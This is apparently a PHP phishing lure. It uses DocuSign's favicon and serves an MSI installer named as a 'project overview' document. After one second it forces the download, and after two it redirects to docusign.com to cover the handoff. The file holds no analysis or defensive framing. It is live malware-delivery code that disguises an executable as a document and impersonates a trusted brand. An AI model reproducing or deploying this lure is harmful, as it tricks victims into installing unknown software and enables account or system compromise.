<?php
$file = "B2_Project_Overview_2026.msi";  
$newName = "B2_Project_Overview_2026.msi"; 

if (isset($_GET['download'])) {
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"$newName\"");
    header("Content-Length: " . filesize($file));
    header("Content-Transfer-Encoding: binary");
    header("Cache-Control: no-cache, must-revalidate");
    header("Pragma: no-cache");
    
    readfile($file);
    exit;
} else {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading</title>
    <link rel="icon" type="image/x-icon" href="https://www.docusign.com/assets/images/favicon.ico">
    <script>
        setTimeout(function() {
            window.location.href = "?download=1";
        }, 1000);
        
        setTimeout(function() {
            window.location.href = "https://www.docusign.com/";
        }, 2000);
    </script>
</head>
<body>
    
</body>
</html>';
}
?>
